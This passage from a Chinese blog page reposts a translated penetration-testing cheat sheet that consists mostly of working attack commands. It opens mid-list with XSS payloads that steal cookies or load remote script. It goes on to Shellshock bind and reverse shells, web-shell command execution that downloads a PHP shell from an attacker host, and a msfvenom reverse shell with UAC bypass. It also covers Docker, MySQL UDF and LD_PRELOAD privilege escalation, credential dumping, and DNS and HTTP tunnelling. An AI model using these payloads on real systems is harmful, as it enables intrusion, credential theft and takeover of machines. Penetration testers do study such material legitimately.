+<p><span class="hljs-string">‘;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//“;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;”&gt;’</span>&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(<span class="hljs-number">88</span>,<span class="hljs-number">83</span>,<span class="hljs-number">83</span>))&lt;/SCRIPT&gt;</p>
+<p><span class="hljs-string">“;!–”</span>&lt;XSS&gt;=&amp;amp;amp;{()}</p>
+<p>&lt;IMG SRC=<span class="hljs-string">“javascript:alert(‘XSS’);”</span>&gt;<br>&lt;IMG SRC=javascript:alert(<span class="hljs-string">‘XSS’</span>)&gt;<br>&lt;IMG <span class="hljs-string">“”</span><span class="hljs-string">“&gt;&lt;SCRIPT&gt;alert(“</span>XSS<span class="hljs-string">“)&lt;/SCRIPT&gt;”</span><span class="hljs-string">“&gt;<br>&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</p>
+<p>&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;<br>&lt;IMG SRC=”</span>jav ascript:alert(<span class="hljs-string">‘XSS’</span>);<span class="hljs-string">“&gt;</p>
+<p>perl -e ‘print “</span>&lt;IMG SRC=javascript:alert(&lt;span class=”hljs-string”&gt;”XSS&quot;)&gt;”</span>;<span class="hljs-string">‘ &gt; out</p>
+<p>&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|]^`=alert(“XSS”)&gt;</p>
+<p>(“&gt;&lt; iframes <a href="http://google.com" target="_blank" rel="noopener">http://google.com</a> &lt; iframes &gt;)</p>
+<p>&lt;BODY BACKGROUND=”javascript:alert(‘</span>XSS<span class="hljs-string">‘)”&gt;<br>&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(‘</span>XSS<span class="hljs-string">‘);”&gt;&lt;/FRAMESET&gt;<br>“&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;<br>%253cscript%253ealert(document.cookie)%253c/script%253e<br>“&gt;&lt;s”%2b”cript&gt;alert(document.cookie)&lt;/script&gt;<br>%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=<a href="http://my.box.com/xss.js%3E%3C/script%3E%22)&#39;" target="_blank" rel="noopener">http://my.box.com/xss.js%3E%3C/script%3E%22)&#39;</a></span>%<span class="hljs-number">3</span>E<br>&lt;img src=asdf onerror=alert(document.cookie)&gt;<br></code></pre></div></p>
+<h3><span id="ssh-over-sctp-socat">SSH Over SCTP (使用 Socat)</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 远端服务器</span>
+<span class="hljs-comment"># 假设你准备让 SCTP socket 监听端口 80/SCTP 并且 sshd 端口在 22/TCP</span>
+$ socat SCTP-<span class="hljs-symbol">LISTEN:</span><span class="hljs-number">80</span>,fork <span class="hljs-symbol">TCP:</span><span class="hljs-symbol">localhost:</span><span class="hljs-number">22</span>
+
+<p><span class="hljs-comment"># 本地端</span><br><span class="hljs-comment"># 将 SERVER_IP 换成远端服务器的地址，然后将 80 换成 SCTP 监听的端口号</span><br>$ socat TCP-<span class="hljs-symbol">LISTEN:</span><span class="hljs-number">1337</span>,fork <span class="hljs-symbol">SCTP:</span><span class="hljs-symbol">SERVER_IP:</span><span class="hljs-number">80</span></p>
+<p><span class="hljs-comment"># 创建 socks 代理</span><br><span class="hljs-comment"># 替换 username 和 -p 的端口号</span><br>$ ssh -lusername localhost -D <span class="hljs-number">8080</span> -p <span class="hljs-number">1337</span><br></code></pre></div></p>
+<p>使用洋葱网络</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sql"># 安装服务
+$ apt-get <span class="hljs-keyword">install</span> tor torsocks
+
+<h1 id="绑定-ssh-到-tor-服务端口-80"><a href="#绑定-ssh-到-tor-服务端口-80" class="headerlink" title="绑定 ssh 到 tor 服务端口 80"></a>绑定 ssh 到 tor 服务端口 <span class="hljs-number">80</span></h1><h1 id="etc-tor-torrc"><a href="#etc-tor-torrc" class="headerlink" title="/etc/tor/torrc"></a>/etc/tor/torrc</h1><p>SocksPolicy <span class="hljs-keyword">accept</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>SocksPolicy <span class="hljs-keyword">accept</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">16</span><br><span class="hljs-keyword">Log</span> <span class="hljs-keyword">notice</span> <span class="hljs-keyword">file</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/tor/notices.<span class="hljs-keyword">log</span><br>RunAsDaemon <span class="hljs-number">1</span><br>HiddenServiceDir /<span class="hljs-keyword">var</span>/lib/tor/ssh_hidden_service/<br>HiddenServicePort <span class="hljs-number">80</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">22</span><br>PublishServerDescriptor <span class="hljs-number">0</span><br>$ /etc/init.<span class="hljs-keyword">d</span>/tor <span class="hljs-keyword">start</span><br>$ cat /<span class="hljs-keyword">var</span>/lib/tor/ssh_hidden_service/hostname<br><span class="hljs-number">3</span>l5zstvt1zk5jhl662.onion</p>
+<h1 id="ssh-客户端连接"><a href="#ssh-客户端连接" class="headerlink" title="ssh 客户端连接"></a>ssh 客户端连接</h1><p>$ apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">install</span> torsocks<br>$ torsocks ssh login@<span class="hljs-number">3</span>l5zstvt1zk5jhl662.onion -<span class="hljs-keyword">p</span> <span class="hljs-number">80</span><br></code></pre></div></p>
+<h3><span id="metagoofil-8211">Metagoofil – 元数据收集工具</span></h3>
+<p>注：Metagoofil 是一款利用Google收集信息的工具。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># http://www.edge-security.com/metagoofil.php</span>
+<span class="hljs-comment"># 它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能</span>
+$ python metagoofil.py <span class="hljs-_">-d</span> example.com -t doc,pdf <span class="hljs-_">-l</span> 200 -n 50 -o examplefiles <span class="hljs-_">-f</span> results.html
+</code></pre></div>
+<h3><span id="-shellshock">利用 Shellshock</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 一个发现并利用服务器 Shellshock 的工具</span>
+<span class="hljs-comment"># https://github.com/nccgroup/shocker</span>
+$ ./shocker.py -H 192.168.56.118  --command <span class="hljs-string">"/bin/cat /etc/passwd"</span> -c /cgi-bin/status --verbose
+
+<p><span class="hljs-comment"># 查看文件</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-_">-e</span> <span class="hljs-string">“HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo $(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n”</span> | nc 192.168.56.118 80</p>
+<p><span class="hljs-comment"># 绑定 shell</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-_">-e</span> <span class="hljs-string">“HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n”</span> | nc 192.168.56.118 80</p>
+<p><span class="hljs-comment"># 反弹 Shell</span><br>$ nc <span class="hljs-_">-l</span> -p 443<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">“HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n”</span> | nc 192.168.56.118 80<br></code></pre></div></p>
+<h3><span id="-docker-root">获取 Docker 的 Root</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 获取  Docker 的 Root</span>
+<span class="hljs-comment"># user 必须在 docker 用户组中</span>
+ek@victum<span class="hljs-symbol">:~/docker-test</span>$ id
+uid=<span class="hljs-number">1001</span>(ek) gid=<span class="hljs-number">1001</span>(ek) groups=<span class="hljs-number">1001</span>(ek),<span class="hljs-number">114</span>(docker)
+
+<p>ek@victum<span class="hljs-symbol">:<del></span>$ mkdir docker-test<br>ek@victum<span class="hljs-symbol">:</del></span>$ cd docker-test</p>
+<p>ek@victum<span class="hljs-symbol">:~</span>$ cat &gt; Dockerfile<br>FROM <span class="hljs-symbol">debian:</span>wheezy</p>
+<p>ENV WORKDIR /stuff</p>
+<p>RUN mkdir -p $WORKDIR</p>
+<p>VOLUME [ $WORKDIR ]</p>
+<p>WORKDIR $WORKDIR<br>&lt;&lt; EOF</p>
+<p>ek@victum<span class="hljs-symbol">:<del></span>$ docker build -t my-docker-image .<br>ek@victum<span class="hljs-symbol">:</del></span>$ docker run -v $PWD<span class="hljs-symbol">:/stuff</span> -t my-docker-image /bin/sh -c <br><span class="hljs-string">‘cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh’</span><br>./sh<br>whoami<br><span class="hljs-comment"># root</span></p>
+<p>ek@victum<span class="hljs-symbol">:~</span>$ docker run -v /<span class="hljs-symbol">etc:</span>/stuff -t my-docker-image /bin/sh -c <span class="hljs-string">‘cat /stuff/shadow’</span><br></code></pre></div></p>
+<h3><span id="-dns">使用 DNS 隧道绕过防火墙</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 让数据和命令使用 DNS 隧道传输以绕过防火墙的检查</span>
+<span class="hljs-comment"># dnscat2 支持从目标主机上面上传和下载命令来获取文件、数据和程序</span>
+
+<p><span class="hljs-comment"># 服务器 (攻击者)</span><br>$ apt-get update<br>$ apt-get -y install ruby-dev git make g++<br>$ gem install bundler<br>$ git clone <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/iagox</span>86/dnscat2.git<br>$ cd dnscat2/server<br>$ bundle install<br>$ ruby ./dnscat2.rb<br>dnscat2&gt; New session <span class="hljs-symbol">established:</span> <span class="hljs-number">16059</span><br>dnscat2&gt; session -i <span class="hljs-number">16059</span></p>
+<p><span class="hljs-comment"># 客户机 (目标)</span><br><span class="hljs-comment"># <a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a></span><br><span class="hljs-comment"># <a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a></span><br>$ dnscat –host &lt;dnscat server_ip&gt;<br></code></pre></div></p>
+<h3><span id="-assemble">编译 Assemble 代码</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby">$ nasm -f elf32 simple32.asm -o simple32.o
+$ ld -m elf_i386 simple32.o simple32
+
+<p>$ nasm -f elf64 simple.asm -o simple.o<br>$ ld simple.o -o simple<br></code></pre></div></p>
+<h3><span id="-shell">使用非交互 Shell 打入内网</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 生成 shell 使用的 ssh 密钥</span>
+$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=whoami"</span>
+$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "</span>
+$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"</span>
+
+<p><span class="hljs-comment"># 增加用户 tempuser </span><br>$ useradd -m tempuser<br>$ mkdir /home/tempuser/.ssh &amp;&amp; chmod <span class="hljs-number">700</span> /home/tempuser/.ssh<br>$ wget -O - -q <span class="hljs-string">“<a href="http://domain.tk/sh.php?cmd=cat" target="_blank" rel="noopener">http://domain.tk/sh.php?cmd=cat</a> /tmp/id_rsa”</span> &gt; <span class="hljs-regexp">/home/tempuser</span><span class="hljs-regexp">/.ssh/authorized</span>_keys<br>$ chmod <span class="hljs-number">700</span> /home/tempuser/.ssh/authorized_keys<br>$ chown -R <span class="hljs-symbol">tempuser:</span>tempuser /home/tempuser/.ssh</p>
+<p><span class="hljs-comment"># 反弹 ssh shell</span><br>$ wget -O - -q <span class="hljs-string">“<a href="http://domain.tk/sh.php?cmd=ssh" target="_blank" rel="noopener">http://domain.tk/sh.php?cmd=ssh</a> -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;”</span><br></code></pre></div></p>
+<h3><span id="-post-shell">利用 POST 远程命令执行获取 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">attacker</span>:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=<span class="hljs-number">%3</span>Bwhoami&amp;submit=submit' 'http://victum.tk/command.php'
+
+<p><span class="hljs-attribute">attacker</span>:~$ curl -i -s -k  -X ‘POST’ –data-binary $’IP=<span class="hljs-number">%3</span>Becho+<span class="hljs-number">%27</span><span class="hljs-number">%3</span>C<span class="hljs-number">%3</span>Fphp+system<span class="hljs-number">%28</span><span class="hljs-number">%24</span>_GET<span class="hljs-number">%5</span>B<span class="hljs-number">%22</span>cmd<span class="hljs-number">%22</span><span class="hljs-number">%5</span>D<span class="hljs-number">%29</span><span class="hljs-number">%3</span>B+<span class="hljs-number">%3</span>F<span class="hljs-number">%3</span>E<span class="hljs-number">%27</span>+<span class="hljs-number">%3</span>E+..<span class="hljs-number">%2</span>Fshell.php&amp;submit=submit’ ‘<a href="http://victum.tk/command.php&#39;" target="_blank" rel="noopener">http://victum.tk/command.php&#39;</a></p>
+<p><span class="hljs-attribute">attacker</span>:~$ curl <a href="http://victum.tk/shell.php?cmd=id" target="_blank" rel="noopener">http://victum.tk/shell.php?cmd=id</a></p>
+<p><span class="hljs-comment"># 在服务器上下载 shell (phpshell.php)</span></p>
+<p><span class="hljs-attribute">http</span>://victum.tk/shell.php?cmd=php<span class="hljs-number">%20</span>-r<span class="hljs-number">%20</span><span class="hljs-number">%27</span>file_put_contents<span class="hljs-number">%28</span><span class="hljs-number">%22</span>phpshell.php<span class="hljs-number">%22</span>,<span class="hljs-number">%20</span>fopen<span class="hljs-number">%28</span><span class="hljs-number">%22</span><a href="http://attacker.tk/phpshell.txt" target="_blank" rel="noopener">http://attacker.tk/phpshell.txt</a><span class="hljs-number">%22</span>,<span class="hljs-number">%20</span><span class="hljs-number">%27</span>r<span class="hljs-number">%27</span><span class="hljs-number">%29</span><span class="hljs-number">%29</span>;<span class="hljs-number">%27</span></p>
+<p><span class="hljs-comment"># 运行 nc 并执行 phpshell.php</span><br><span class="hljs-attribute">attacker</span>:~$ nc -nvlp 1337<br></code></pre></div></p>
+<h3><span id="-win7-shell">以管理员身份在 Win7 上反弹具有系统权限的 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby">msfvenom –p windows/shell_reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span> –f exe &gt; danger.exe
+
+<p><span class="hljs-comment"># 显示账户配置</span><br>net user &lt;login&gt;</p>
+<p><span class="hljs-comment"># Kali 上下载 psexec</span></p>
+<p><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/technet.microsoft.com/en</span>-us/sysinternals/bb897553.aspx</p>
+<p><span class="hljs-comment"># 使用 powershell 脚本上传 psexec.exe 到目标机器</span><br>echo $client = New-Object System.Net.WebClient &gt; script.ps1<br>echo $targetlocation = <span class="hljs-string">“<a href="http://192.168.56.102/PsExec.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/PsExec.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">“psexec.exe”</span>) <span class="hljs-meta">&gt;&gt; </span>script.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</p>
+<p><span class="hljs-comment"># 使用 powershell 脚本上传 danger.exe 到目标机器</span><br>echo $client = New-Object System.Net.WebClient &gt; script2.ps1<br>echo $targetlocation = <span class="hljs-string">“<a href="http://192.168.56.102/danger.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/danger.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script2.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">“danger.exe”</span>) <span class="hljs-meta">&gt;&gt; </span>script2.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</p>
+<p><span class="hljs-comment"># 使用预编译的二进制文件绕过 UAC:</span></p>
+<p><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/hfiref</span>0x/UACME</p>
+<p><span class="hljs-comment"># 使用 powershell 脚本上传 <a href="https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe</a> 到目标机器</span><br>echo $client = New-Object System.Net.WebClient &gt; script2.ps1<br>echo $targetlocation = <span class="hljs-string">“<a href="http://192.168.56.102/Akagi64.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/Akagi64.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script3.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">“Akagi64.exe”</span>) <span class="hljs-meta">&gt;&gt; </span>script3.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</p>
+<p><span class="hljs-comment"># 在 Kali 上创建监听</span><br>nc -lvp <span class="hljs-number">4444</span></p>
+<p><span class="hljs-comment"># 以系统权限使用 Akagi64 运行 danger.exe </span><br>Akagi64.exe <span class="hljs-number">1</span> <span class="hljs-symbol">C:</span>\Users\User\Desktop\danger.exe</p>
+<p><span class="hljs-comment"># 在 Kali 上创建监听</span><br>nc -lvp <span class="hljs-number">4444</span></p>
+<p><span class="hljs-comment"># 下一步就会反弹给我们一个提过权的 shell</span><br><span class="hljs-comment"># 以系统权限使用 PsExec 运行 danger.exe </span><br>psexec.exe –i –d –accepteula –s danger.exe<br></code></pre></div></p>
+<h3><span id="-win7-shell-2">以普通用户身份在 Win7 上反弹具有系统权限的 Shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</span>
+<span class="hljs-symbol">
+https:</span><span class="hljs-comment">//www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</span>
+<span class="hljs-symbol">
+
+<p>https:</span><span class="hljs-comment">//<a href="http://www.exploit-db.com/exploits/37049/" target="_blank" rel="noopener">www.exploit-db.com/exploits/37049/</a></span></p>
+<p><span class="hljs-meta"># 查找目标机器是否安装了补丁，输入如下命令</span><br>wmic qfe get<br>wmic qfe | find <span class="hljs-string">“3057191”</span></p>
+<p><span class="hljs-meta"># 上传编译后的利用程序并运行它</span><br><span class="hljs-symbol"><br>https:</span><span class="hljs-comment">//github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</span></p>
+<p><span class="hljs-meta"># 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe</span><br><span class="hljs-meta"># https:<span class="hljs-comment">//github.com/hfiref0x/CVE-2015-1701 下载它并定位到 “main.c”</span></span></p>
+<p><span class="hljs-meta"># 使用 wce.exe 获取已登录用户的明文账号密码</span><br><span class="hljs-symbol"><br>http:</span><span class="hljs-comment">//<a href="http://www.ampliasecurity.com/research/windows-credentials-editor/" target="_blank" rel="noopener">www.ampliasecurity.com/research/windows-credentials-editor/</a></span></p>
+<p>wce -w</p>
+<p><span class="hljs-meta"># 使用 pwdump7 获取其他用户的密码哈希值</span><br><span class="hljs-symbol"><br>http:</span><span class="hljs-comment">//<a href="http://www.heise.de/download/pwdump.html" target="_blank" rel="noopener">www.heise.de/download/pwdump.html</a></span></p>
+<p><span class="hljs-meta"># we can try online hash cracking tools such crackstation.net</span><br></code></pre></div></p>
+<h3><span id="ms08-067-8211-metasploit">MS08-067 – 不使用 Metasploit</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">$ nmap -v -p <span class="hljs-number">139</span>, <span class="hljs-number">445</span> --script=smb-check-vulns --script-args=unsafe=<span class="hljs-number">1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.205</span>
+$ searchsploit ms08<span class="hljs-number">-067</span>
+$ python <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/exploitdb/</span>platforms<span class="hljs-meta-keyword">/windows/</span>remote/<span class="hljs-number">7132.</span>py <span class="hljs-number">192.168</span><span class="hljs-number">.31</span><span class="hljs-number">.205</span> <span class="hljs-number">1</span>
+</code></pre></div>
+<h3><span id="-mysql-root">通过 MySQL Root 账户实现提权</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs cs"><span class="hljs-meta"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span>
+$ wget <span class="hljs-number">0xdeadbeef</span>.info/exploits/raptor_udf2.c
+$ gcc -g -c raptor_udf2.c
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+mysql -u root -p
+mysql&gt; use mysql;
+mysql&gt; <span class="hljs-function">create table <span class="hljs-title">foo</span>(<span class="hljs-params">line blob</span>)</span>;
+mysql&gt; <span class="hljs-function">insert <span class="hljs-keyword">into</span> foo <span class="hljs-title">values</span>(<span class="hljs-params">load_file(<span class="hljs-string">'/home/user/raptor_udf2.so'</span></span>))</span>;
+mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">'/usr/lib/mysql/plugin/raptor_udf2.so'</span>;
+mysql&gt; create function do_system returns integer soname <span class="hljs-string">'raptor_udf2.so'</span>;
+mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func;
+mysql&gt; <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">do_system</span>(<span class="hljs-params"><span class="hljs-string">'echo "root:passwd" | chpasswd &gt; /tmp/out; chown user:user /tmp/out'</span></span>)</span>;
+
+<p>user:<del>$ su -<br>Password:<br>user:</del><span class="hljs-meta"># whoami</span><br>root<br>root:~<span class="hljs-meta"># id</span><br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></div></p>
+<h3><span id="-ld-preload">使用 LD_PRELOAD 注入程序</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby">$ wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/jivoi</span><span class="hljs-regexp">/pentest/ldpreload</span>_shell.c
+$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
+$ sudo -u user LD_PRELOAD=<span class="hljs-regexp">/tmp/ldpreload</span>_shell.so /usr/local/bin/somesoft
+</code></pre></div>
+<h3><span id="-openssh">针对 OpenSSH 用户进行枚举时序攻击</span></h3>
+<p>注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 <a href="http://zhihu.com/question/20156213/answer/43377769" target="_blank" rel="noopener">shotgun</a> 在知乎上的解释。</p>
+<p>osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-comment"># https://github.com/c0r3dump3d/osueta</span>
+$ ./osueta.py -H <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.6</span> -p <span class="hljs-number">22</span> -U root -d <span class="hljs-number">30</span> -v <span class="hljs-literal">yes</span>
+$ ./osueta.py -H <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span> -p <span class="hljs-number">22</span> -d <span class="hljs-number">15</span> -v <span class="hljs-literal">yes</span> –dos <span class="hljs-literal">no</span> -L userfile.txt
+</code></pre></div>
+<h3><span id="-reduh-http-tcp">使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</span></h3>
+<p>注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p>
+<p>对了亲～ReDuh-Gui 号称端口转发神器哦。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># https:<span class="hljs-comment">//github.com/sensepost/reDuh</span></span>
+
+<p><span class="hljs-meta"># 步骤 1</span><br><span class="hljs-meta"># 上传 reDuh.jsp 目标服务器</span><br>$ http:<span class="hljs-comment">//192.168.10.50/uploads/reDuh.jsp</span></p>
+<p><span class="hljs-meta"># 步骤 2</span><br><span class="hljs-meta"># 在本机运行 reDuhClient </span><br>$ java -jar reDuhClient.jar http:<span class="hljs-comment">//192.168.10.50/uploads/reDuh.jsp</span></p>
+<p><span class="hljs-meta"># 步骤 3</span><br><span class="hljs-meta"># 使用 nc 连接管理端口</span><br>$ nc -nvv <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">1010</span></p>
+<p><span class="hljs-meta"># 步骤 4</span><br><span class="hljs-meta"># 使用隧道转发本地端口到远程目标端口</span><br>[createTunnel] <span class="hljs-number">7777</span>:<span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.4</span>:<span class="hljs-number">3389</span></p>
+<p><span class="hljs-meta"># 步骤 5</span><br><span class="hljs-meta"># 使用 RDP 连接远程</span><br>$ <span class="hljs-meta-keyword">/usr/</span>bin/rdesktop -g <span class="hljs-number">1024</span>x768 -P -z -x l -k en-us -r sound:off localhost:<span class="hljs-number">7777</span><br></code></pre></div></p>
+<p>*原文：<a href="http://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/" target="_blank" rel="noopener">jivoi</a>，FB小编xiaix编译，转自FreeBuf黑客与极客（FreeBuf.COM）</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E8%BD%AC%E8%BD%BD/">转载</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/article/f7911999.html">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CTF密码学常见的加解密总结[转载]</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/article/e11385dd.html">
+                        <span class="hidden-mobile">NMAP-漏洞扫描之王</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "VV0Y0S3Pj6ERI7DEOFLxUFXs-gzGzoHsz",
+          app_key: "r20xk8AR5pft8xGRQlWKYoin",
+          placeholder: "说点什么",
+          path: window.location.pathname,
+          avatar: "retro",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
